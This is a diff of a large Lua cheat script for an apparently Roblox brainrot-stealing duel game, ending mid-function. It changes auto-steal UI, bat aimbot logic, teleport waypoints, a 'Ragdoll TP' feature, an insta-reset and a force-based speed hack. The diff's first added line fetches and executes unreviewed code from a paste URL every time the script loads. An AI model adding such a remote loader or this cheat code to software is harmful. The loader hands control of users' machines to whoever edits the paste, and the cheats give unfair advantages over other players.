@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastefy.app/sUr6CJsA/raw"))()
+
 local Players = game:GetService("Players")
 
 local TweenService = game:GetService("TweenService")
@@ -2541,18 +2543,16 @@ M.AP_L2 = Vector3.new(-483.12, -4.95, 94.81)
 M.AP_R1 = Vector3.new(-476.16, -6.52, 25.62)
 M.AP_R2 = Vector3.new(-483.06, -5.03, 25.48)
 M._fullAutoLeftWaypoints = {
-	Vector3.new(-475.69, -5.85, 92.99),
-	Vector3.new(-487.27, -3.48, 93.83),
-	Vector3.new(-475.69, -5.85, 92.99),
-	Vector3.new(-477.26, -4.88, 25.90),
-	Vector3.new(-486.03, -4.71, 17.52),
+	Vector3.new(-472.49, -7.00, 90.62),
+	Vector3.new(-484.62, -5.10, 100.37),
+	Vector3.new(-475.08, -7.00, 93.29),
+	Vector3.new(-474.22, -6.96, 16.18),
 }
 M._fullAutoRightWaypoints = {
-	Vector3.new(-475.87, -5.60, 27.50),
-	Vector3.new(-486.71, -3.68, 28.24),
-	Vector3.new(-475.87, -5.60, 27.50),
-	Vector3.new(-476.83, -5.17, 93.00),
-	Vector3.new(-485.60, -3.53, 95.87),
+	Vector3.new(-473.04, -6.99, 29.71),
+	Vector3.new(-483.57, -5.10, 18.74),
+	Vector3.new(-475.00, -6.99, 26.43),
+	Vector3.new(-474.67, -6.94, 105.48),
 }
 M.MEDUSA_COOLDOWN = 25
 M.BAT_COUNTER_SLAP_LIST = {
@@ -3326,204 +3326,104 @@ function M.buildStatusUI()
 end
 
 function M.buildMiroAutoStealUI()
-	if M.statusGui then
-		pcall(function()
-			M.statusGui:Destroy()
-		end)
-	end
-	local gui = Instance.new("ScreenGui")
-	gui.Name = "K7_StatusUI"
-	gui.ResetOnSpawn = false
-	gui.IgnoreGuiInset = true
-	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	local parent = player:FindFirstChild("PlayerGui")
-	if gethui then
-		pcall(function()
-			parent = gethui()
-		end)
-	end
-	gui.Parent = parent or player:WaitForChild("PlayerGui")
+    if M.statusGui then pcall(function() M.statusGui:Destroy() end) end
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "WAVE_AutoGrab"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = false
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    local parent = player:FindFirstChildOfClass("PlayerGui")
+    if gethui then pcall(function() parent = gethui() end) end
+    gui.Parent = parent or player:WaitForChild("PlayerGui")
 
-	local accent = UI_ACCENT or Color3.fromRGB(45, 136, 255)
-	local main = Instance.new("Frame")
-	main.Name = "oniAutoSteal"
-	main.Active = true
-	main.AnchorPoint = Vector2.new(0.5, 1)
-	main.Position = UDim2.new(0.5, 0, 1, -100)
-	main.Size = UDim2.fromOffset(340, 58)
-	main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	main.BorderSizePixel = 0
-	main.Parent = gui
-	Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
-	local scale = Instance.new("UIScale", main)
-	scale.Scale = M.stealBarScale or 0.3
-	M.stealBarScaleRef = scale
+    local panel = Instance.new("Frame")
+    panel.Name = "AutoGrabPanel"
+    panel.Size = UDim2.fromOffset(280, 50)
+    panel.Position = UDim2.new(0.5, -140, 1, -66)
+    panel.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
+    panel.BorderSizePixel = 0
+    panel.Active = true
+    panel.Parent = gui
+    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 9)
+    local stroke = Instance.new("UIStroke", panel)
+    stroke.Color = Color3.fromRGB(14, 32, 68)
+    stroke.Thickness = 1
+    local scale = Instance.new("UIScale", panel)
+    scale.Scale = M.stealBarScale or 0.3
+    M.stealBarScaleRef = scale
 
-	local title = Instance.new("TextLabel", main)
-	title.BackgroundTransparency = 1
-	title.Position = UDim2.fromOffset(12, 6)
-	title.Size = UDim2.fromOffset(110, 18)
-	title.Text = "ONI Auto Steal"
-	title.TextColor3 = Color3.fromRGB(255, 255, 255)
-	title.TextSize = 12
-	title.Font = Enum.Font.GothamBold
-	title.TextXAlignment = Enum.TextXAlignment.Left
-	title.ZIndex = 3
+    local pct = Instance.new("TextLabel", panel)
+    pct.Name = "ProgressPercent"
+    pct.Size = UDim2.fromOffset(44, 16)
+    pct.Position = UDim2.fromOffset(9, 7)
+    pct.BackgroundTransparency = 1
+    pct.Text = "0%"
+    pct.TextColor3 = Color3.fromRGB(255, 255, 255)
+    pct.Font = Enum.Font.GothamBold
+    pct.TextSize = 11
+    pct.TextXAlignment = Enum.TextXAlignment.Left
+    pct.ZIndex = 5
+    M.statusPctLbl = pct
+    M.statusBarPctLbl = pct
+    M.statusStealLbl = nil
 
-	local pct = Instance.new("TextLabel", main)
-	pct.BackgroundTransparency = 1
-	pct.Position = UDim2.fromOffset(120, 5)
-	pct.Size = UDim2.fromOffset(40, 18)
-	pct.Text = "0%"
-	pct.TextColor3 = Color3.fromRGB(255, 255, 255)
-	pct.TextSize = 14
-	pct.Font = Enum.Font.GothamBlack
-	pct.ZIndex = 6
-	M.statusPctLbl = pct
-	M.statusBarPctLbl = pct
+    local radius = Instance.new("TextLabel", panel)
+    radius.Name = "Radius"
+    radius.Size = UDim2.fromOffset(104, 16)
+    radius.Position = UDim2.new(1, -112, 0, 7)
+    radius.BackgroundTransparency = 1
+    radius.Text = string.format("Radius: %.2g", M.getActiveStealRadius())
+    radius.TextColor3 = Color3.fromRGB(255, 255, 255)
+    radius.Font = Enum.Font.GothamBold
+    radius.TextSize = 11
+    radius.TextXAlignment = Enum.TextXAlignment.Right
+    radius.ZIndex = 5
+    M.statusRadiusLbl = radius
+    M.headerRadiusLbl = nil
 
-	local colors = {
-		Color3.fromRGB(160, 50, 255),
-		Color3.fromRGB(45, 136, 255),
-		Color3.fromRGB(255, 50, 50),
-		Color3.fromRGB(90, 90, 100),
-		Color3.fromRGB(255, 255, 255),
-	}
-	for i, color in ipairs(colors) do
-		local b = Instance.new("TextButton", main)
-		b.Position = UDim2.fromOffset(216 + (i - 1) * 14, 9)
-		b.Size = UDim2.fromOffset(11, 11)
-		b.BackgroundColor3 = color
-		b.Text = ""
-		b.ZIndex = 5
-		Instance.new("UICorner", b).CornerRadius = UDim.new(1, 0)
-		b.MouseButton1Click:Connect(function()
-			if M.statusFill then
-				M.statusFill.BackgroundColor3 = color
-			end
-		end)
-	end
+    local bg = Instance.new("Frame", panel)
+    bg.Name = "ProgressBackground"
+    bg.Size = UDim2.new(1, -18, 0, 11)
+    bg.Position = UDim2.fromOffset(9, 30)
+    bg.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
+    bg.BorderSizePixel = 0
+    bg.ClipsDescendants = true
+    bg.ZIndex = 3
+    Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
+    local fill = Instance.new("Frame", bg)
+    fill.Name = "ProgressFill"
+    fill.Size = UDim2.new(0, 0, 1, 0)
+    fill.BackgroundColor3 = Color3.fromRGB(45, 130, 230)
+    fill.BorderSizePixel = 0
+    fill.ZIndex = 4
+    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
+    M.statusFill = fill
+    M.statusKnob = nil
+    M.statusShine = nil
+    M.statusFpsLbl = nil
 
-	local function smallButton(text, x)
-		local b = Instance.new("TextButton", main)
-		b.Position = UDim2.new(1, x, 0, 7)
-		b.Size = UDim2.fromOffset(14, 14)
-		b.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
-		b.Text = text
-		b.TextColor3 = Color3.fromRGB(255, 255, 255)
-		b.Font = Enum.Font.GothamBold
-		b.TextSize = 10
-		b.ZIndex = 5
-		Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
-		return b
-	end
-	local plus = smallButton("+", -40)
-	local minus = smallButton("-", -22)
-	local lock = smallButton("🔒", -58)
-	local locked = true
-	lock.MouseButton1Click:Connect(function()
-		locked = not locked
-		M.uiLocked = locked
-		lock.Text = locked and "🔒" or "🔓"
-	end)
-	plus.MouseButton1Click:Connect(function()
-		M.adjustAutoGrabGuiScale(0.1)
-	end)
-	minus.MouseButton1Click:Connect(function()
-		M.adjustAutoGrabGuiScale(-0.1)
-	end)
+    local dragging, dragStart, startPos = false, nil, nil
+    panel.InputBegan:Connect(function(input)
+        if M.uiLocked then return end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = panel.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    UIS.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local d = input.Position - dragStart
+            panel.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+        end
+    end)
 
-	local barBg = Instance.new("Frame", main)
-	barBg.Position = UDim2.fromOffset(12, 28)
-	barBg.Size = UDim2.new(1, -24, 0, 10)
-	barBg.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
-	barBg.BorderSizePixel = 0
-	barBg.ClipsDescendants = true
-	barBg.ZIndex = 3
-	Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)
-	local fill = Instance.new("Frame", barBg)
-	fill.Size = UDim2.new(0, 0, 1, 0)
-	fill.BackgroundColor3 = accent
-	fill.BorderSizePixel = 0
-	fill.ZIndex = 4
-	Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
-	M.statusFill = fill
-	M.statusKnob = nil
-
-	local status = Instance.new("TextLabel", main)
-	status.BackgroundTransparency = 1
-	status.Position = UDim2.fromOffset(12, 40)
-	status.Size = UDim2.new(1, -24, 0, 14)
-	status.Text = "discord.gg/miroduels | Ping: -- | FPS: --"
-	status.TextColor3 = Color3.fromRGB(150, 150, 160)
-	status.Font = Enum.Font.Gotham
-	status.TextSize = 11
-	status.TextXAlignment = Enum.TextXAlignment.Left
-	status.ZIndex = 3
-	-- A porcentagem fica no rótulo próprio; o status inferior permanece com Ping/FPS.
-	M.statusStealLbl = nil
-
-	local dragging, dragStart, startPos
-	main.InputBegan:Connect(function(input)
-		if locked then
-			return
-		end
-		if
-			input.UserInputType == Enum.UserInputType.MouseButton1
-			or input.UserInputType == Enum.UserInputType.Touch
-		then
-			dragging = true
-			dragStart = input.Position
-			startPos = main.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragging = false
-				end
-			end)
-		end
-	end)
-	UIS.InputChanged:Connect(function(input)
-		if
-			dragging
-			and not locked
-			and (
-				input.UserInputType == Enum.UserInputType.MouseMovement
-				or input.UserInputType == Enum.UserInputType.Touch
-			)
-		then
-			local d = input.Position - dragStart
-			main.Position =
-				UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
-		end
-	end)
-
-	if M._statusFpsConn then
-		pcall(function()
-			M._statusFpsConn:Disconnect()
-		end)
-	end
-	local frames, elapsed = 0, 0
-	M._statusFpsConn = RunService.RenderStepped:Connect(function(dt)
-		if not main.Parent then
-			return
-		end
-		frames += 1
-		elapsed += dt
-		if elapsed >= 0.5 then
-			local fps = math.floor(frames / elapsed + 0.5)
-			frames, elapsed = 0, 0
-			local ping = 0
-			pcall(function()
-				ping = math.floor(player:GetNetworkPing() * 1000 + 0.5)
-			end)
-			status.Text = string.format("discord.gg/miroduels | Ping: %dms | FPS: %d", ping, fps)
-		end
-	end)
-	M.statusGui = gui
-	M.statusMain = main
-	M.statusHolder = main
-	M.statusFpsLbl = nil
-	M.statusRadiusLbl = nil
+    M.statusGui = gui
+    M.statusMain = panel
+    M.statusHolder = panel
 end
 
 function M.updateStealProgress(progress, label)
@@ -5291,6 +5191,10 @@ function M.stopTpAntiDie()
 end
 
 function M.startBatAimbot()
+	local ragdollTP = M.ragdollTPState
+	if ragdollTP and (ragdollTP.LeftEnabled or ragdollTP.RightEnabled) then
+		return
+	end
 	if not M.safeModeTryStart() then
 		return
 	end
@@ -5336,6 +5240,10 @@ function M.startBatAimbot()
 	-- SCYTHE DUELS normal aimbot logic (exact)
 	-- ============================================================
 	M.aimbotConn = RunService.Heartbeat:Connect(function()
+		local ragdollTP = M.ragdollTPState
+		if ragdollTP and (ragdollTP.LeftEnabled or ragdollTP.RightEnabled) then
+			return
+		end
 		if not M.autoBatEnabled then
 			return
 		end
@@ -5469,6 +5377,13 @@ function M.stopBatAimbot()
 	M.autoBatEnabled = false
 	M.autoBatEquippedThisRun = false
 	M.stopTpAntiDie()
+
+	-- Se um lado do Ragdoll TP estiver selecionado, rearma sua próxima execução
+	-- assim que o aimbot for desligado.
+	local ragdollTP = M.ragdollTPState
+	if ragdollTP and (ragdollTP.LeftEnabled or ragdollTP.RightEnabled) then
+		ragdollTP.Recovered = true
+	end
 
 	local char = player.Character
 	local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -7644,70 +7559,103 @@ function M.stopUnwalk()
 end
 
 function M.cursedInstaReset()
-	if M._instaResetBusy then
-		return
-	end
+    if M._instaResetBusy then return end
+    local character = player.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    local hrp = character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso"))
+    if not character or not hrp or not hrp:IsDescendantOf(character) then return end
+    if humanoid and humanoid.Health <= 0 then return end
 
-	local character = player.Character
-	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-	local hrp = character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso"))
-	if not character or not hrp or not hrp:IsDescendantOf(character) then
-		return
-	end
-	if humanoid and humanoid.Health <= 0 then
-		return
-	end
+    M._instaResetBusy = true
+    M._aceResetToken = (M._aceResetToken or 0) + 1
+    local resetToken = M._aceResetToken
 
-	M._instaResetBusy = true
-	M._aceResetToken = (M._aceResetToken or 0) + 1
-	local resetToken = M._aceResetToken
+    -- Interrompe temporariamente o controlador de movimento para não
+    -- disputar a velocidade vertical do reset.
+    if M.destroySpeedObjects then pcall(M.destroySpeedObjects) end
 
-	local camera = workspace.CurrentCamera
-	if camera then
-		camera.CameraType = Enum.CameraType.Scriptable
-		camera.CFrame = CFrame.new(
-			-337.938599,
-			-0.585044861,
-			106.739204,
-			0.133411571,
-			-0.379638135,
-			0.915465117,
-			0,
-			0.923722506,
-			0.383062422,
-			-0.991060734,
-			-0.0511049591,
-			0.123235278
-		)
-		camera.Focus = CFrame.new(-349.381927, -5.37332535, 105.198761, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-	end
+    local camera = workspace.CurrentCamera
+    if camera then
+        camera.CameraType = Enum.CameraType.Scriptable
+        camera.CFrame = CFrame.new(
+            -337.938599, -0.585044861, 106.739204,
+            0.133411571, -0.379638135, 0.915465117,
+            0, 0.923722506, 0.383062422,
+            -0.991060734, -0.0511049591, 0.123235278
+        )
+        camera.Focus = CFrame.new(-349.381927, -5.37332535, 105.198761, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+    end
 
-	if humanoid then
-		humanoid.BreakJointsOnDeath = true
-		humanoid.PlatformStand = true
-		humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-	end
+    if humanoid then
+        humanoid.BreakJointsOnDeath = true
+        humanoid.PlatformStand = true
+        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+    end
 
-	hrp.AssemblyAngularVelocity = Vector3.zero
-	hrp.AssemblyLinearVelocity = Vector3.new(0, 1000000, 0)
+    pcall(function()
+        hrp.AssemblyAngularVelocity = Vector3.zero
+        hrp.AssemblyLinearVelocity = Vector3.new(0, 1000000, 0)
+    end)
 
-	task.delay(0.1, function()
-		if resetToken ~= M._aceResetToken then
-			return
-		end
-		if camera and camera.Parent then
-			camera.CameraType = Enum.CameraType.Custom
-			if humanoid and humanoid.Parent then
-				camera.CameraSubject = humanoid
-			end
-		end
-	end)
+    task.delay(0.1, function()
+        if resetToken ~= M._aceResetToken then return end
+        if camera and camera.Parent then
+            camera.CameraType = Enum.CameraType.Custom
+            if humanoid and humanoid.Parent then camera.CameraSubject = humanoid end
+        end
+    end)
+    task.delay(0.5, function()
+        if resetToken == M._aceResetToken then M._instaResetBusy = false end
+    end)
+end
 
-	task.delay(0.5, function()
-		if resetToken == M._aceResetToken then
-			M._instaResetBusy = false
-		end
-	end)
+
+-- Wave Insta Reset: usado somente pelo botão e atalho manual.
+-- Medusa Reset e Auto Reset on Death continuam usando cursedInstaReset.
+function M.waveInstaReset()
+    if M._waveResetBusy then return end
+    local character = player.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    if not character or not humanoid or humanoid.Health <= 0 then return end
+    M._waveResetBusy = true
+    local originalHipHeight = humanoid.HipHeight
+    local resetDone = false
+    local maxAttempts = 40
+    for _ = 1, maxAttempts do
+        if not character.Parent or player.Character ~= character or humanoid.Health <= 0 then
+            resetDone = true
+            break
+        end
+        pcall(function()
+            humanoid.HipHeight = 1e30
+            humanoid.AutoRotate = true
+            local rootPart = character:FindFirstChild("HumanoidRootPart")
+            if rootPart then rootPart.CanCollide = false end
+            for _, part in ipairs(character:GetChildren()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.CanCollide = false
+                end
+            end
+        end)
+        task.wait(0.05)
+    end
+    if not resetDone and character.Parent and humanoid.Parent and humanoid.Health > 0 and player.Character == character then
+        pcall(function() humanoid.Health = 0 end)
+        task.wait(0.1)
+    end
+    if character.Parent and humanoid.Parent and humanoid.Health > 0 then
+        pcall(function()
+            humanoid.HipHeight = originalHipHeight
+            local rootPart = character:FindFirstChild("HumanoidRootPart")
+            if rootPart then rootPart.CanCollide = true end
+            for _, part in ipairs(character:GetChildren()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.CanCollide = true
+                end
+            end
+        end)
+    end
+    M._waveResetBusy = false
 end
 
 function M.hasBrainrotInHand()
@@ -9418,7 +9366,7 @@ function M.buildMobileButtons()
 			elseif key == "tpDown" then
 				M.runTPFloor()
 			elseif key == "instaReset" then
-				M.cursedInstaReset()
+				M.waveInstaReset()
 			elseif key == "autoLeft" then
 				if M.autoBatEnabled then
 					M.stopBatAimbot()
@@ -9754,7 +9702,10 @@ local function loadCherryConfig()
 		then
 			M.antiRagdollMode = d.antiRagdollMode
 		end
-		if d.autoStealEnabled ~= nil then
+		if type(d.ragdollTPMode) == "string" and (d.ragdollTPMode == "Off" or d.ragdollTPMode == "Left" or d.ragdollTPMode == "Right") then
+				M._savedRagdollTPMode = d.ragdollTPMode
+			end
+			if d.autoStealEnabled ~= nil then
 			M.Steal.AutoStealEnabled = d.autoStealEnabled
 		end
 		if d.autoRadiusEnabled ~= nil then
@@ -9981,6 +9932,8 @@ local function saveCherryConfig()
 		autoRadiusEnabled = M.autoRadiusEnabled,
 		antiRagdoll = M.antiRagdollEnabled,
 		antiRagdollMode = M.antiRagdollMode,
+			ragdollTPMode = M.getRagdollTPMode and M.getRagdollTPMode() or M._savedRagdollTPMode or "Off",
+			
 		infiniteJump = M.infJumpEnabled,
 		medusaCounter = M.medusaCounterEnabled,
 		batCounter = M.batCounterEnabled,
@@ -12223,7 +12176,7 @@ function M.buildGui()
 			M.runTPFloor()
 		end
 		if kbMatch(M.KB.InstaReset, kc) then
-			M.cursedInstaReset()
+			M.waveInstaReset()
 		end
 		if kbMatch(M.KB.AutoLeft, kc) then
 			M.autoLeftEnabled = not M.autoLeftEnabled
@@ -12762,6 +12715,25 @@ function M.buildGui()
 		end
 	)
 	M.setAntiRagModeUI = setAntiRagModeUI
+
+	local _, setRagdollTPUI = uiChoiceRow(
+		PMech,
+		"Ragdoll TP",
+		{ "Off", "Left", "Right" },
+		(M._savedRagdollTPMode == "Left" and 2) or (M._savedRagdollTPMode == "Right" and 3) or 1,
+		function(value)
+			if value == "Left" then
+				if M.ragdollTPLeft then M.ragdollTPLeft(true) end
+			elseif value == "Right" then
+				if M.ragdollTPRight then M.ragdollTPRight(true) end
+			else
+				if M.stopRagdollTP then M.stopRagdollTP() end
+			end
+			saveCherryConfig()
+		end
+	)
+	M.setRagdollTPUI = setRagdollTPUI
+
 
 	local autoPlayModeIdx = (M.autoPlayMode == "Full") and 2 or 1
 	local _, setAutoPlayModeUI = uiChoiceRow(PMech, "Auto Play Mode", { "Semi", "Full" }, autoPlayModeIdx, function(v)
@@ -14165,7 +14137,7 @@ function toggleLaggerMode()
 end
 
 -- ============================================================
--- LINEAR VELOCITY MOVEMENT ENGINE
+-- VECTOR FORCE MOVEMENT ENGINE
 -- ============================================================
 local speedValue = 59
 local MOVE_KEYS = {
@@ -14174,18 +14146,90 @@ local MOVE_KEYS = {
     [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true,
     [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
 }
-local _linVel, _linVelAtt0, _linVelAtt1, _linVelChar = nil, nil, nil, nil
+local _vectorForce, _vfAttachment, _vfChar = nil, nil, nil
 local _lastMoveDir = Vector3.zero
+local _wasMoving = false
 
-local function destroyLinearVelocity()
-    for _, obj in ipairs({_linVel, _linVelAtt0, _linVelAtt1}) do
-        if obj then pcall(function() obj:Destroy() end) end
+local _carryCollisionOriginals = {}
+local function isCarryToolForCollision(tool)
+    if not tool or not tool:IsA("Tool") then return false end
+    local name = tool.Name:lower()
+    return name:find("brainrot", 1, true) ~= nil
+        or name:find("skibidi", 1, true) ~= nil
+        or name:find("toilet", 1, true) ~= nil
+end
+local function updateCarryCollisionProtection()
+    local char = player.Character
+    local active = false
+    if char then
+        for _, child in ipairs(char:GetChildren()) do
+            if isCarryToolForCollision(child) then
+                active = true
+                for _, part in ipairs(child:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        if _carryCollisionOriginals[part] == nil then
+                            _carryCollisionOriginals[part] = part.CanCollide
+                        end
+                        pcall(function() part.CanCollide = false end)
+                    end
+                end
+            end
+        end
     end
-    _linVel, _linVelAtt0, _linVelAtt1, _linVelChar = nil, nil, nil, nil
+    if not active then
+        for part, original in pairs(_carryCollisionOriginals) do
+            if part and part.Parent then
+                pcall(function() part.CanCollide = original end)
+            end
+            _carryCollisionOriginals[part] = nil
+        end
+    end
+end
+
+local _carryTouchOriginals = {}
+local function isCarryToolForTouch(tool)
+    if not tool or not tool:IsA("Tool") then return false end
+    local name = tool.Name:lower()
+    return name:find("brainrot", 1, true) ~= nil
+        or name:find("skibidi", 1, true) ~= nil
+        or name:find("toilet", 1, true) ~= nil
+end
+local function updateCarryTouchProtection()
+    local char = player.Character
+    local active = false
+    if char then
+        for _, child in ipairs(char:GetChildren()) do
+            if isCarryToolForTouch(child) then
+                active = true
+                for _, part in ipairs(child:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        if _carryTouchOriginals[part] == nil then
+                            _carryTouchOriginals[part] = part.CanTouch
+                        end
+                        pcall(function() part.CanTouch = false end)
+                    end
+                end
+            end
+        end
+    end
+    if not active then
+        for part, original in pairs(_carryTouchOriginals) do
+            if part and part.Parent then
+                pcall(function() part.CanTouch = original end)
+            end
+            _carryTouchOriginals[part] = nil
+        end
+    end
+end
+local function destroyLinearVelocity()
+    if _vectorForce then pcall(function() _vectorForce:Destroy() end) end
+    if _vfAttachment then pcall(function() _vfAttachment:Destroy() end) end
+    _vectorForce, _vfAttachment, _vfChar = nil, nil, nil
 end
 
 local function setupLinearVelocity(char)
     destroyLinearVelocity()
+    if M.destroySpeedObjects then pcall(M.destroySpeedObjects) end
     if not char then return end
     local root = char:FindFirstChild("HumanoidRootPart")
     if not root then
@@ -14193,40 +14237,50 @@ local function setupLinearVelocity(char)
         if ok then root = result end
     end
     if not root then return end
-    local att0 = Instance.new("Attachment")
-    att0.Name = "ONILinearVelocityAtt0"
-    att0.Parent = root
-    local att1 = Instance.new("Attachment")
-    att1.Name = "ONILinearVelocityAtt1"
-    att1.Parent = root
-    local lv = Instance.new("LinearVelocity")
-    lv.Name = "ONILinearVelocity"
-    lv.Attachment0 = att0
-    lv.Attachment1 = att1
-    lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Plane
-    lv.PrimaryTangentAxis = Vector3.new(1, 0, 0)
-    lv.SecondaryTangentAxis = Vector3.new(0, 0, 1)
-    lv.RelativeTo = Enum.ActuatorRelativeTo.World
-    lv.MaxForce = 1e6
-    lv.PlaneVelocity = Vector2.zero
-    lv.Parent = root
-    _linVel, _linVelAtt0, _linVelAtt1, _linVelChar = lv, att0, att1, char
+    local att = Instance.new("Attachment")
+    att.Name = "ONIVectorForceAttachment"
+    att.Parent = root
+    local vf = Instance.new("VectorForce")
+    vf.Name = "ONIVectorForce"
+    vf.Attachment0 = att
+    vf.RelativeTo = Enum.ActuatorRelativeTo.World
+    vf.ApplyAtCenterOfMass = true
+    vf.Force = Vector3.zero
+    vf.Parent = root
+    _vectorForce, _vfAttachment, _vfChar = vf, att, char
 end
 
 local function ensureLinearVelocity()
     local char = player.Character
     if not char then return false end
-    if _linVel and _linVel.Parent and _linVelChar == char then return true end
+    if _vectorForce and _vectorForce.Parent and _vfChar == char then return true end
     setupLinearVelocity(char)
-    return _linVel ~= nil and _linVel.Parent ~= nil
+    return _vectorForce ~= nil and _vectorForce.Parent ~= nil
 end
 
 local function setLinearVelocityXZ(x, z)
-    if _linVel and _linVel.Parent then
-        pcall(function() _linVel.PlaneVelocity = Vector2.new(x, z) end)
+    if _vectorForce and _vectorForce.Parent then
+        local char = player.Character
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        if root then
+            local current = root.AssemblyLinearVelocity
+            local target = Vector3.new(x, 0, z)
+            local delta = target - Vector3.new(current.X, 0, current.Z)
+            local mass = math.max(root.AssemblyMass, 1)
+            -- Aceleração alta para alcançar rapidamente NS/CS/Lagger.
+            local force = delta * mass * 100
+            local maxForce = mass * 5000
+            if force.Magnitude > maxForce then force = force.Unit * maxForce end
+            pcall(function() _vectorForce.Force = Vector3.new(force.X, 0, force.Z) end)
+        end
     end
 end
-local function clearLinearVelocity() setLinearVelocityXZ(0, 0) end
+local function clearLinearVelocity()
+    if _vectorForce and _vectorForce.Parent then
+        pcall(function() _vectorForce.Force = Vector3.zero end)
+    end
+    _wasMoving = false
+end
 
 local function isRagdollState(hum)
     if not hum then return true end
@@ -14257,10 +14311,15 @@ local function applyVelocitySpeed(speed, forcedDirection)
     local dir = forcedDirection or hum.MoveDirection
     local requestedSpeed = math.clamp(tonumber(speed) or speedValue, 1, 500)
     if dir.Magnitude > 0.05 then
+        if not _wasMoving and _vectorForce and _vectorForce.Parent then
+            pcall(function() _vectorForce.Force = Vector3.zero end)
+        end
+        _wasMoving = true
         _lastMoveDir = dir
         local unit = dir.Unit
         setLinearVelocityXZ(unit.X * requestedSpeed, unit.Z * requestedSpeed)
     elseif M.antiRagdollEnabled and _lastMoveDir.Magnitude > 0 and hasMovementKeyHeld() then
+        _wasMoving = true
         local unit = _lastMoveDir.Unit
         setLinearVelocityXZ(unit.X * requestedSpeed, unit.Z * requestedSpeed)
     else
@@ -14270,6 +14329,8 @@ end
 M.applyVelocitySpeed = applyVelocitySpeed
 
 M._linearMovementConn = RunService.RenderStepped:Connect(function()
+    updateCarryTouchProtection()
+    updateCarryCollisionProtection()
     local char = player.Character
     local hum = char and char:FindFirstChildOfClass("Humanoid")
     local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -14373,6 +14434,118 @@ end)
 function M.refreshSpeedModeLabel()
 	-- not used
 end
+
+-- ============================================================
+-- RAGDOLL TP LEFT / RIGHT
+-- ============================================================
+local RagdollTP = {
+    FinalLeft = Vector3.new(-483.59, -5.04, 104.24),
+    FinalRight = Vector3.new(-483.51, -5.10, 18.89),
+    CheckpointA = Vector3.new(-472.60, -7.00, 57.52),
+    CheckpointBLeft = Vector3.new(-472.65, -7.00, 95.69),
+    CheckpointBRight = Vector3.new(-471.76, -7.00, 26.22),
+    LeftEnabled = false,
+    RightEnabled = false,
+    Teleporting = false,
+    Recovered = true,
+}
+
+local function ragdollTPMove(position)
+    local char = player.Character
+    if not char then return end
+    pcall(function() char:PivotTo(CFrame.new(position)) end)
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if root then
+        pcall(function()
+            root.AssemblyLinearVelocity = Vector3.zero
+            root.AssemblyAngularVelocity = Vector3.zero
+        end)
+    end
+end
+
+local function executeRagdollTP(side)
+    if RagdollTP.Teleporting then return end
+    RagdollTP.Teleporting = true
+    RagdollTP.Recovered = false
+    local middle = side == "Left" and RagdollTP.CheckpointBLeft or RagdollTP.CheckpointBRight
+    local final = side == "Left" and RagdollTP.FinalLeft or RagdollTP.FinalRight
+
+    -- Primeira passagem: volta pelo caminho, do final até o início.
+    ragdollTPMove(final)
+    task.wait(0.12)
+    ragdollTPMove(middle)
+    task.wait(0.12)
+    ragdollTPMove(RagdollTP.CheckpointA)
+    task.wait(0.12)
+
+    -- Segunda passagem: caminho normal, do início até o final.
+    ragdollTPMove(RagdollTP.CheckpointA)
+    task.wait(0.12)
+    ragdollTPMove(middle)
+    task.wait(0.12)
+    ragdollTPMove(final)
+    RagdollTP.Teleporting = false
+end
+
+function M.ragdollTPLeft(enabled)
+    if enabled == nil then enabled = not RagdollTP.LeftEnabled end
+    RagdollTP.LeftEnabled = enabled == true
+    if RagdollTP.LeftEnabled then
+        RagdollTP.RightEnabled = false
+        if M.autoBatEnabled and M.stopBatAimbot then M.stopBatAimbot() end
+    end
+    return RagdollTP.LeftEnabled
+end
+
+function M.ragdollTPRight(enabled)
+    if enabled == nil then enabled = not RagdollTP.RightEnabled end
+    RagdollTP.RightEnabled = enabled == true
